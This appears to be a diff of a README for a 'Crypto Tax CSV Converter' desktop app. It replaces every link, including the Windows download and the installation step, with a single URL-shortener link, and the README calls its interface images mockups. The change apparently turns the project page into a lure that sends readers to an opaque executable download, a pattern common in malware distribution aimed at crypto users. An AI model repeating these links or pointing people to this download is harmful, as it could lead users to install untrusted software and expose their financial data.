@@ -12,31 +12,31 @@ It focuses on **data conversion and cleanup**, not automatic tax filing: import 
 
 ## Quick Access
 
-[![CSV](https://img.shields.io/badge/Crypto-CSV%20Converter-2da66f?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Offline](https://img.shields.io/badge/Local-Processing-178c62?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Mapping](https://img.shields.io/badge/Column-Mapping-3984df?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Export](https://img.shields.io/badge/Unified-CSV-7652cc?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Windows%20Build-2f81f7?style=for-the-badge)](https://idleobstacle.github.io/)
+[![CSV](https://img.shields.io/badge/Crypto-CSV%20Converter-2da66f?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Offline](https://img.shields.io/badge/Local-Processing-178c62?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Mapping](https://img.shields.io/badge/Column-Mapping-3984df?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Export](https://img.shields.io/badge/Unified-CSV-7652cc?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Windows%20Build-2f81f7?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Crypto Tax CSV Converter Desktop](https://idleobstacle.github.io/)**
+➡️ **[Download Crypto Tax CSV Converter Desktop](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Crypto Tax CSV Converter](assets/crypto-tax-csv-converter-preview.png)](https://idleobstacle.github.io/)
+[![Crypto Tax CSV Converter](assets/crypto-tax-csv-converter-preview.png)](https://flyn.co/17yeN7/)
 
 ### Dashboard
 
-[![Crypto CSV Dashboard](assets/crypto-tax-csv-dashboard.png)](https://idleobstacle.github.io/)
+[![Crypto CSV Dashboard](assets/crypto-tax-csv-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Conversion Workflow
 
-[![Crypto CSV Workflow](assets/crypto-tax-csv-workflow.png)](https://idleobstacle.github.io/)
+[![Crypto CSV Workflow](assets/crypto-tax-csv-workflow.png)](https://flyn.co/17yeN7/)
 
 > Interface images are project mockups.
 
@@ -187,7 +187,7 @@ This is only an example schema, not a prescribed tax format.
 ## Installation
 
 1. Download the current package:
-   **[Download Windows Build](https://idleobstacle.github.io/)**
+   **[Download Windows Build](https://flyn.co/17yeN7/)**
 2. Extract it to a dedicated folder.
 3. Start the desktop application.
 4. Add one or more CSV files.
@@ -244,7 +244,7 @@ Type: Offline CSV / Data Conversion Utility
 Focus: Data normalization / validation / duplicate review
 Input: Local CSV files
 Output: Normalized / unified CSV datasets
-Website: https://idleobstacle.github.io/
+Website: https://flyn.co/17yeN7/
 ```
 
 ---
